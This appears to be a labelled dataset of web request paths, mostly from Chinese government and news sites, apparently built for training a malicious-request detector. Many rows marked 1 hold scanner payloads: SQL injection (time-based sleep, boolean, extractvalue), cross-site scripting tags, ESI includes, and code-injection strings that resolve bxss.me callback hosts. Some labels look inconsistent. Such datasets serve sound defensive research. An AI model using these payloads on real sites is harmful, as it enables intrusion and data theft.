request	label
/zwxx_11337/****/202002/t20200210_1948403.html	0
/****/qzfwj/201801/t20180115_669218.html?from=groupmessage&isappinstalled=0	0
/xwdt'||'/****/csjs/gzdt.htm	1
/*******/qiye/b-e1261649.html	0
/if(now()=sysdate(),sleep(15),0)/**/lib/easyui/plugins/jquery.linkbutton.js	1
/****/zycs/201706/w020191129324694573751.jpg	0
/****/20201211/e112126850.html	0
/******/n42746'||'/c1722946/content.html	1
/****/ypj/yw/202008/t20200805_2179383.html	0
/************/interfaces/dimension.do?begin=20201023&end=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&eq=1&oq=1&p=1&pg=1&pos=filenumber&pq=&q=请输入关键词&searchid=44&tpl=16&websiteid=110105008056111	1
/***/ggfw/images2/7.gif	0
/******/system/2018/02/01/javascript:void();	1
/***/resource/fonts/fontawesome-webfont.ttf?v=4.3.0</textarea>--><xss_2309107187673e6b5ba54e6689418ebd/><!--<textarea>	1
/*******/qiye/0zx9ma_e144538732.html	0
/****/czgk/bmjs/zzqfyxt/sptqrmfy/index_1.html	0
/********/recipes/feed	0
/**/ui//xfs.bxss.me/hanweb/ie6fixed/ie6fixed.js	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u6b27\u6ce2\u7f57\u96c6\u6210\u88c5\u9970\u5e97	0
"/***/wp-admin/admin.php?page=thecartpress/admin/addressedit.php&address_id='""><script>alert(77729;</script>"	1
/zwxx_11337/****/202109/t20210924_3046897_zzb.html	0
/*********/treasury/index.aspx?nodeid=394 and 5949=5949-- tmwb	1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u5e38\u9752\u85e4\u6559\u80b2\u670d\u52a1\u5de5\u4f5c\u5ba4	0
/****/web/search?searchword=1&channelid=287219') or 8480=8480 /*&perpage=24&templet=1&token=1	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u7965\u745e\u658b\u8001\u5317\u4eac\u7279\u8272\u6dae\u8089\u5728\u6c34\u4e00\u65b9\u5e97	0
/****/slash-cms/index.php?mod=sl_pages&id=alert(777)	1
/zwxx_11337/****/202111/t20211102_3112435_zzb.html	0
/****/201903/t20190328_206040.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u683c\u8c6a\u5546\u884c	0
/****/mtgz/2012mtgz/index_9.html	0
/***/0/01/93/25/1932513_999763.png	0
"/************/template/jcse/110105008056111/16/' 'a'.concat(70-3).concat(22*4).concat(98).concat(80).concat(122).concat(78) (require'socket'
socket.gethostbyname('hiteu' 'mszqfepyb029f.bxss.me.')[3].to_s) '/ui.css"	1
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u5c0f\u53c8\u519c\u4ea7\u54c1\u7ecf\u7eaa\u884c	0
/**********/system/2017/04/18/012289403.shtml	0
/*******/col200/index.html	1
/**********/system/2021/12/15/013494554.shtml	0
/****/fkxxfy/202110/t20211021_195547.html	0
/******/system/2010/10/28/010222462.shtml	0
/*****/search.asp?field=my_baizi&classid=&keyword=\ufffd\ufffd\u04ab\ufffd\ufffd	0
/****************/notification/negotiate?access_token=799b1183-0be1-49d6-9e08-b249da967a7b	0
"/****/byszf/bxss.me/t/xss.html?	1
/****/8zqm5v-hynews-e106945437.html	0
/******/system/2015/06/15/011740483.shtml	0
/****/bmkx/jtysj/202101/w020210126632389812804.jpg	0
"/************/' 'a'.concat(70-3).concat(22*4).concat(109).concat(83).concat(109).concat(82) (require'socket'
socket.gethostbyname('hitbk' 'hvsgpobzce733.bxss.me.')[3].to_s) '/jcse/110105008056111/16/images/searchbtn.js"	1
/**********/system/2021/06/07/013398363.shtml	0
/****/zzxxgk/jjhzj/zsxw/202004/t20200413_165745.html	0
/***/003/004/472/00300447272_abe7f0cc.jpg	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u738b\u5de7\u5170\u8f6e\u80ce\u4fee\u8865\u5e97	0
/*****/gy42/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\u0373\u04bb(\ufffd\ufffd\ufffd\ufffd)&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u4e00\u54c1\u74f7\u7535\u89c6\u80cc\u666f\u5899\u7ecf\u9500\u5e97	0
/****/web/search?channelid=222832&searchword=\u7075\u65b0\u77ff\u7075\u82d1\u706b\u9505\u57ce	0
/***/0/02/12/29/2122910_727938.jpg	0
"/****/' 'a'.concat(70-3).concat(22*4).concat(120).concat(74).concat(100).concat(66) (require'socket'
socket.gethostbyname('hitnh' 'nxmxrlwk8fca8.bxss.me.')[3].to_s) '/swsj/"	1
"/***/?refresh="";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink()""//"	1
/****/ztbd/index_5.html	0
/**********/system/2020/04/04/013132089.shtml	0
/*******/049r.php	1
/***/0/10/66/14/10661492_574826.jpg	1
/******/system/2017/12/06/javascript:window.close();	1
/**/system/2020/12/28/012108734.shtml	0
/****/web/search?perpage=1000	1
/***/portal?act=onearticle&r=0.4048690828312087	0
/****/system/2016/07/15/012056727.shtml	0
/*******/qiye/businesses-e42579_2.html?category_id=252467	0
/****/web/search?&channelid=234439&searchword=reserves&keyword=reserves	0
/****/bysw/202109/t20210930_194993.html?leader=\u5218\u529b\u6c5f	0
/****/tpgj/fprw/index_1.html	0
/****/zzxxgk/wsjkwyh/gzdt_3599/tzgg_3600/201706/t20170606_162616.html	0
/******/system/2021/04/06/013364206.shtml	0
/**********/system/2020/05/26/javascript:void();	1
"/****/gw_admin.php?a="""">alert(777);&t=settings"	1
/*****/system/2021/12/13/013493905.shtml	0
/***/blockdata/getsearchinfo.do?&title=\u58ee	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtimhyvjff0a29k3nv7ax1gy=&openid=ovl7jjqzfdsxnol1zpqwnkleydzy&outer_str=10335&activate_ticket=fdzv9emqaffrnr3xboqhb8r 17ezbzozeqtqrbkhzp/oo8dbj5 fzedtzplsmcarprw0rjkjsoxgv/3pxbfq5p0k6ywxf6hkp7 rz/91nfc=	0
/***/0/01/91/00/1910063_979938.jpg	0
/****/system/2013/06/18/javascript:dozoom(14)	1
/****/system/content_p/2020-09/16/content_102261.html	0
/***********/zaojianpinglun/?_=1640025725220	0
/****/wzs/spbd/	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u4e2d\u5174\u8fbe\u6c7d\u8f66\u9500\u552e\u6709\u9650\u516c\u53f8	0
/*******/alsffr4.php	1
/*****/system/2015/09/12/011818592.shtml	0
/**********/system/2020/05/24/013168896.shtml	0
/zwxx_11337/****/202111/t20211123_3144491_zzb.html	0
/****/http://bxss.me/t/fit.txt?.jpg/tjj/zfxxgkml_2127/hygq_2064/list.html	1
/**/system/2021/12/09/012228555.shtml	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u5b8f\u5174\u5bb6\u7535\u5236\u51b7\u7ef4\u4fee\u4e2d\u5fc3	0
/**/images/page_products.png	0
/****/wp-admin/admin-ajax.php	1
/******/resource/code/news/click/addclicktimes.jsp?wburlid='and'2121'='2121	1
/****/szyw/2021_szyw/	1
/*****/system/2015/12/27/011898582_01.shtml	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u5929\u5143\u5546\u884c	0
/*******/jiancai	0
/***/003/003/813/00300381338_8ba2e017.jpg	0
/****/zjdt' and 2*3*8=6*8 and 'nvbx'='nvbx/jzgl/gzdt/1.htm	1
/***/interface/daily_clickcount.json.jsp?callback=jquery19103915096425784488_1640034887831	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u5d14\u660e\u6c7d\u8f66\u7ef4\u4fee\u90e8	0
/******/resource'||'/js/centercutimg.js	1
/*****/admin/index.php?step=admin_member_display&search_field=all&keyword=<script>alert(777)</script>&cmd_button=search user	1
"/******/457/' 'a'.concat(70-3).concat(22*4).concat(108).concat(72).concat(117).concat(72) (require'socket'
socket.gethostbyname('hitnd' 'tbozrkqx192c1.bxss.me.')[3].to_s) '.css"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u9876\u725b\u7eaf\u6c64\u725b\u8089\u62c9\u9762\u57ce\u5e02\u516c\u5143\u5e97	0
/****/bmkx/jtysj/202012/t20201221_175080.html	0
/************/common-problem/jyxg' and 2*3*8=6*8 and 'nlfa'='nlfa/2017-02-15/405.html	1
/****/byyw/202005/t20200522_166807_wap.html	0
/****/xydt/2019_xsrw/index_1.html	0
"/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419%') or 8889=8889 	1
"/***/advert?data={""ad_type"":5,""channel_type"":4,""channel_id"":12007,""place_id"":""fm_sp_ard"",""news_id"":""1078966""}"	0
/******/system/2019/08/20/012954601.shtml	0
/***/0/01/75/86/1758683_834834.png	0
/*******/xxgk/lxshzr/gjcp/lxwm/ddjs/lxwm/ywly/jrytz/	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u58f9\u9ebb\u58f9\u8fa3\u9ebb\u8fa3\u70eb\u5e97	0
/************/fxglzgs/contact-us/2017-if(now()=sysdate(),sleep(0),0)-24/193.html	1
/**********/system/2016/01/11/011909195.shtml	0
/****/bmkx/sjsj/201701/t20170111_84717.html	0
/****/gjzqq/index.html?continent=%' and 5649=7411 and '%%'='%	1
/****/zdlygk/bzxajgc1' and 2*3*8=6*8 and 'k76r'='k76r/1.htm	1
/****/mtgz/mt17_6390/index_7.html	0
/****/tpxw/	1
/****/xqdt/byq/201610/t20161025_59859.html	0
/***/0/01/10/10/1101065_923676.jpg	0
/****/system/2017/02/17/javascript:dozoom(9)	1
/****/zfwjn//xfs.bxss.me/1104/list.html	1
/****/zjdt/csjs' and 2*3*8=6*8 and 'h90i'='h90i/1.htm	1
/****/xxgknb/2009/list.html?new=bxss.me	1
/****/zzxxgk/jjhzj/xxgk_3623/zfxxgkml_3628/lzyj_3750/zcfg_3633/202101/t20210104_175571.html	0
"/***/col195/"""" """"a"""".concat(70-3).concat(22*4).concat(110).concat(71).concat(111).concat(83) (require""""socket""""
socket.gethostbyname(""""hitic"""" """"rqsjcnxbef1a4.bxss.me."""")[3].to_s) """".html"	1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u8302\u76db\u519c\u5bb6\u9910\u5385	0
/*******/ll9.php	1
/*******/yw5.php	1
/****/ftl/images/****/top.png	0
"/****/gfxwj/201910/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5317\u4eac\u529e\u4e8b\u5904</a>"	0
/****/sj1/tjsj/202109/w020210926369757745042.png	0
"/************/'""""()&%<acx><script >47ey(9537)</script>/jcse/website.js"	1
/*****/gy42/cpgyss.asp?key=\ufffd\ufffd\u0479\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/***/003/004/301/00300430187_8916782a.jpg	0
/****/zjdt/csjs/zcwj/2.htm	1
/**/system/2021/02/01/javascript:void(0);	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u5bfb\u5473\u574a\u719f\u98df\u5e97	0
"/****/system/2021/09/08/013447520.shtml/""><script>alert(165)</script>"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e50\u4eab\u4eba\u751f\u5546\u884c	0
/**********/system/2015/12/16/011889776.shtml	0
/***/preshippingcontract/preshippingview	0
/****/guojiagongwuyuan/zhaokaoxinxi/ksgg/	0
/****/bmkx/sfgw/202005/w020200508354916733891.jpg	0
/**********/system/2016/04/19/011984633.shtml	0
"/**/wh.html/""""><script>alert(818)</script>"	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u795d\u827e\u541b\u79d1\u6280\u6709\u9650\u516c\u53f8	0
/******/uploadpic/image/20190603/1559530031726720.jpg	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u8d85\u950b\u5546\u884c	0
/*******/202009/202009012239241208.html	1
/****/system/2013/09/11/javascript:window.print()	1
"/************/categorysearch.do?cateid=1&eq=1&oq=1&p=' 'a'.concat(70-3).concat(22*4).concat(109).concat(78).concat(106).concat(74) (require'socket'
socket.gethostbyname('hitgb' 'ndrtyjzgbdb80.bxss.me.')[3].to_s) '&pg=15&pos=1&pq=1&q=请输入关键词&ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111"	1
/****/bmkx/jtysj/202105/w020210527487070534698.png	0
/****/dqgz/201412/w020141218673827142827.jpg	0
/*****/system/2008/02/03/002356490.shtml	0
/*******/qiye/businesses-e38277_3.html?category_id=164024	0
/*****/20210519/9857.html	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u9e3f\u8fd0\u4e66\u793e	0
"/****/web/search?channelid=234439&orderby=relevance' and 9041=6814 	1
/******/public/2020/07/14/98445.images/v98445_b1594701012131_app.jpg	0
/****/gjmt/gjmyt/ and 1>1	1
/****/0822/475435.shtml	0
/****/jtdt/jt16/201612/t20161202_107107.html	0
/****/\ufffd\ufffd\ufffd\ufffd\ufffd?page=2	0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u4e07\u5bb6\u7ea2\u5546\u5e97	0
/**************/csrreports/	0
/****/2011mtgz	0
/***/index.jsp	1
"/***/col195/index.html"""" and """"x""""=""""y"	1
/****/20211021/javascript:void(0);	1
/****/fkxxfy/202108/t20210816_185757_wap.html	0
/***/0/01/68/23/1682309_267858.jpg	0
/****/category/zhengcefagui?page=1' or 6564=6564 /*	1
/******/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1)	1
/****/20210221/e116780264.html	0
/*****/20210531/9923.html	0
/*******/qiye/b-e2050346.html	0
/***/0/00/45/25/452533_655932.jpg	0
/****/xxgkml/qtfdxx/zcjd/szcjd/202012/w020201222361747731390.png	0
/****/20210326/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/*****/shipin/	0
/**********/system/2020/04/09/013135138.shtml	0
/******/system/2020/03/19/013119112.shtml	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u90b5\u521a\u9547\u5174\u65fa\u9992\u5934\u5e97	0
/zwxx_11337/****/202110/t20211021_3100384.html	0
/***/xinwen/idqw1s/l0.shtml	0
/****/gccb/gckc/images/p020141121380301579426.png	0
/*****/	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u65f6\u5c1a\u8d35\u65cf\u5a5a\u7eb1\u5f71\u697c	0
/******/qjlt/	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtgsizk3w37m4er1vap/ysms=&openid=ovl7jjph_rhxe393mtge6up689q0&outer_str=scanqrcode&activate_ticket=fdzv9emqaffrnr3xboqhbx8yhvbytc8sepxp51lqbcnhfifidrt1ejnprxbtx1zv h7pbk1srmgbcm9zirvon5ozkxflgzs5bt1i96ob5cw=	0
/*****/reporting/admin/notificationpopup.php?new=1&type=cr&height=alert(777)	1
/**/sustainability/csrreports/201908/p020190828492944733517.pdf	0
/******/public/2021/12/02/20211202_17d79d3e2f7_r1_1200k.mp4	0
/******/resource/js/language.js	0
"/**/template.cfm?fusebox.ajax="""">alert(777)&myfusebox.originalcircuit=clogin"	1
/****/20181113/5840.html	0
/****/category/buchangdongtai	1
/****/qzfwj/list_18.html	0
/*****/system/2021/08/16/javascript:void(0);	1
/**********/system/2021/08/04/013430368.shtml	0
/***/blockdata/getsearchinfo.do?&title=\u4f11\u95f2\u533a	0
/****/zzxxgk/tjj/zfxxgkml_2127/'.gethostbyname(lc('hitoy'.'aualpyie0e754.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(119).chr(76).chr(97).chr(78).'_2061/list.html	1
/******/20191122.jpg	0
"/****/bxss.me/t/xss.html?	1
/**********/system/2021/12/03/013489627.shtml	0
/*******/mswpmm/common/signin.aspx?tbpassword=alert(777)returnurl=/mswpmm/common/default.aspx	1
"/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/********/js/centercutimg.js"	1
/****/productlistcategory.html?productcategoryid=(select char(97) char(110) char(111) char(110) char(121) char(109) char(111) char(117) char(115) char(95) char(115) char(104) char(111) char(112))&price1=3079&&price2=3319	1
/******/usercenter/index?qrcode=3258&code=031owbll2zrqk84hvcml23odxx1owblz	0
/****/xxgkml/gfgy/ghbg/ghjh_3697/201611/t20161109_72411.html	0
/**********/system/2021/12/04/013489861.shtml	0
/****/dczj/wjdc' and 2*3*8=6*8 and '6chc'='6chc.htm	1
/****/bmkx/sjsj/201909/t20190905_141846.html	0
/******/usercenter/index?qrcode=quicklyrq,2,0,77105&code=051jxall2askk84yzpol2pdnyy1jxalx	0
"/****/海上丝绸之路?page=1'""""()&%<acx><script >zpld(9768)</script>"	1
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u4e03\u8425\u9547\u674e\u6210\u624d\u8d27\u8fd0\u90e8	0
/****/zt/msss/msxw/201905/t20190522_1514190.html	0
/****************/notification?access_token=f03c1540-6c03-4566-891c-7fc481dd3ead&id=undefined	0
/**/system/2021/04/21/012154323.shtml	0
/****/ftl/images/****/logo.png	0
/enjoymobilexcx_mt/****/getpicverifycode?mobile=102010087&type=\u9884\u7ea6&dt=1640016018585	0
"/************/interfaces/dimension.do?"""" """"a"""".concat(70-3).concat(22*4).concat(101).concat(82).concat(112).concat(70) (require""""socket""""
socket.gethostbyname(""""hitsn"""" """"ttebfmqb571a9.bxss.me."""")[3].to_s) """""	1
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u01e7\ufffd\ufda5&l=\ufffd\ufffd\ufffd\ufffd	0
/*******/qiye/b-e1960295.html	0
/****/bmkx/sgaj/http://bxss.me/t/fit.txt?.jpg/t20181208_112298.html	1
/*******/qiye/b-e1747074.html	0
"/****/哈电党建/*/-->'""""></iframe></script></style></title></textarea><script >alert(46439)</script>?page=1"	1
/****/api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5(833669731))) --	1
/****/mswpmm/common/signin.aspx?tbpassword=alert(777)returnurl=/mswpmm/common/default.aspx	1
/*******/n99y.php	1
/****/xxgkml/qtfdxx/zdjcyjzj/202001/t20200114_146504.html	0
/******/resource/js/if(now()=sysdate(),sleep(12),0)/my97datepicker.htm	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u90ca\u533a\u5174\u76c8\u7269\u8d44\u4f9b\u5e94\u7ad9\u94dd\u5408\u91d1\u88c5\u9970\u90e8	0
"/************/template/jcse/110105008056111/16/images/plugin<esi:include src=""""http://bxss.me/rpb.png""""/>/voice/hzrecorder.js"	1
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1) and 5106=9490#&orderby=-docreltime&perpage=15&outlinepage=10	1
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5b5d\u4e49\u5e02\u76d7\u91c7\u7164\u70ad\u8d44\u6e90\u6848	0
"/***/mydevice/index.jsp?locale=""""><script>alert(777)</script>"	1
/****/czgk/bmjs/zzqjcyxt/zwsrmjcy/index_1.html	0
/****/zdlygk/czzjzdjc/202112/p020211215669830172805.pdf	0
/*****/20180410/4750.html	0
/****/czgk/bmjs/rmtt/yx/202108/t20210818_2978895.html	0
/****/bmkx/snmj/202010/w020201023592730057220.png	0
/*******/201906021516171784	0
/**********/system/2020/04/02/013130951.shtml	0
/*******/zwgk/czgk/bmyjs/zzqfyxt/sptqrmfy/	0
/**/system/2012/09/29/010902769.shtml	1
/*******/l47xfok.php	1
/****/category/yidaiyilutupian?page=1 and 2076=7520--	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u91d1\u6210\u67b8\u675e\u8d2d\u9500\u7ecf\u7eaa\u4eba	0
/****/qzfwj/201801/t20180115_668665.html	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u9676\u4e50\u9547\u4eae\u4eae\u51c9\u76ae\u9ebb\u8fa3\u70eb\u5e97	0
/*******/qiye/b-e2115052.html	0
/******/system/2010/10/28/010222457.shtml	0
/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqghb/	0
/******/lh/images/3.jpg	0
/**********/system/2021/01/11/013317547.shtml	0
/****/zfwjn/1079/1081/list.html?new=bxss.me	1
/*****/system/2010/05/16/010124316.shtml	0
/**/system/2021/12/14/012230158.shtml	0
/****/sj1/tjsj/202111/w020211103596128838007.png	0
/****/czgk/bmyjs/zzqfyxt/sptqrmfy/202103/t20210309_2620023.html	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u9a6c\u70b3\u4ed8\u5e9f\u65e7\u54c1\u6536\u8d2d\u7ad9	0
/**********/system/2016/02/20/011937119.shtml	0
/****/system/2015/12/22/javascript:void(0);	1
/**/system/2021/11/26/javascript:void(0);	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u672a\u4e66\u52c7\u5bb6\u5177\u5e97	0
"/**/ui/lib/easyui/themes/bootstrap"""" and 2*3*8=6*8 and """"xrzt""""=""""xrzt/linkbutton.css"	1
/***/003/002/988/00300298805_05fec823.png	0
/*******/qiye/b-e836177.html	0
/****/qzfwj/201801/t20180115_669250.html	0
/******/resource/code/news/click/clicktimes.jsp?wbnewsid=42888&owner=1329914701&type=wbnewsfile&randomid=nattach	0
/****/20200910/e106513893.html	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u5317\u73af\u98df\u5ba2\u6c49\u9910\u9986	0
/******/business-area/0'xor(if(now()=sysdate(),sleep(9),0))xor'z/	1
/*****/system/2019/08/21/javascript:window.close();	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5f66\u793c\u8089\u725b\u517b\u6b96\u4e13\u4e1a\u5408\u4f5c\u793e	0
/**********/system/2021/10/07/013460824.shtml	0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1' and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)-- &orderby=-docreltime&perpage=15&outlinepage=10	1
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u5174\u65fa\u74f7\u7816\u884c	0
/****/system/2017/01/21/012231391.shtml	0
/****/gjzqq/yz/jpz/201412/w020141211620637711943.jpg	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u7530\u6d0b\u79cd\u690d\u4e13\u4e1a\u5408\u4f5c\u793e	0
/******/1.css	0
/****//680/pzlg3205/xhr_send?t=1632413987938	1
/about-southwest/******/2020-06-15/9756.html	0
/zwxx_11337/****/202004/t20200402_2009507.html	0
/**********/system/2020/12/10/013299867.shtml	0
/***/003/003/709/00300370994_673ca304.jpg	0
/****************/notification?access_token=e8980274-a042-434b-862a-5bfce6e49894&id=undefined	0
/****/bwcx/xxyd/gdpl/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/******/system/2019/11/11/javascript:void(0);	1
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5ba1\u6279	0
/****/he1p.asp	0
/zwxx_11337/****/202109/t20210915_3031861.html	0
/****/zfgb/2020/202012/p020201218599615112226.pdf	0
/****/zzxxgk/bmsthjj/xxgkndbg/201803/t20180322_138596.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u897f\u65fa\u5546\u52a1\u5bbe\u9986	0
/*****/system/2021/11/08/javascript:void();	1
"/****/zfwzjs/201903/"">\u5b81\u590f\u516c\u8def\u7ba1\u7406\u4e2d\u5fc3</a>"	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u6d69\u8fb0\u79d1\u8d38\u6709\u9650\u516c\u53f8	0
/******/?q=1' or 9180=8577 /*	1
/******/qhkf/	0
/*******/qiye/b-e1989785.html	0
/******/system/2018/03/16/012567366.shtml	0
/************/0'xor(if(now()=sysdate(),sleep(6),0))xor'z/2019-04-19/270.html	1
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u6668\u946b\u998d\u998d\u5e97	0
/**********/system/2020/04/04/013132084.shtml	0
"/*****/index.cfm?field="""">alert(777)"	1
/****/b-e888424.html	0
"/****/zzxxgk/tjj/zfxxgkml_2127/jgzn_2042/list'""""()&%<acx><script >uocq(9204)</script>.html"	1
/**/images/idangerous.swiper.css	1
"/****/xxczh1/ywdt/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z.htm"	1
/*****/system/2008/09/27/002606557.shtml	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u7434\u73b2\u7ba1\u4e1a\u7ecf\u9500\u90e8	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u5229\u60e0\u5546\u573a\u53cc\u946b\u56ed\u5e97	0
/******/system/2021/09/08/javascript:window.close();	1
/***/003/003/572/00300357292_392a3d34.jpg	0
/****/xxczh1/ywdt/0'xor(if(now()=sysdate(),sleep(12),0))xor'z.htm	1
/**/system/2021/02/05/javascript:void(0);	1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5144\u5f1f\u5957\u88c5\u95e8\u7ecf\u9500\u90e8	0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u5c45\u5b89\u8857\u4f73\u7f8e\u88c5\u9970\u5e97	0
"/' 'a'.concat(70-3).concat(22*4).concat(106).concat(83).concat(98).concat(90) (require'socket'
socket.gethostbyname('hitgd' 'eaxlmurd048e0.bxss.me.')[3].to_s) '/********/jcse/110105008056111/16/images/searchbtn.js"	1
/***/0/01/68/26/1682635_438982.png	0
/****/ccp_48498/zwhd/202106/t20210622_2894614.html	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u592a\u9633\u5c71\u7cd6\u5fc3\u5c4b\u7ae5\u88c5\u5e97	0
/****/zfwjn/1088/1090/list.html?new=/xfs.bxss.me	1
/*****/system/2021/12/09/javascript:window.close();	1
"/**/ui/lib/security<esi:include src=""""http://bxss.me/rpb.png""""/>/sm2.js"	1
/****/mswpmm/common/newaccount.aspx?btncreateaccount=alert(777)	1
/**/system/2021/10/08/012205616.shtml	1
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqgzw/	0
/***/0/01/79/95/1799597_051018.png	0
"/***/getlist?data={""page_size"":20,""channel_type"":4,""channel_id"":12219}"	0
/*****/javascript:void(0);	1
"/**/ui/widgets/hanweb/iconfont"""" and 2*3*8=6*8 and """"fbq7""""=""""fbq7/css/iconfont.css"	1
/**/system/2020/12/30/012109574.shtml	0
/******/usercenter/index?qrcode=84578	0
"/*****/admin/ccmanage.php?find_enc=1&list=1""><script>alert(777)</script>"	1
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u5eb7\u4e3d\u4e1d\u7406\u53d1\u5e97	0
/****/20180515/4992.html	0
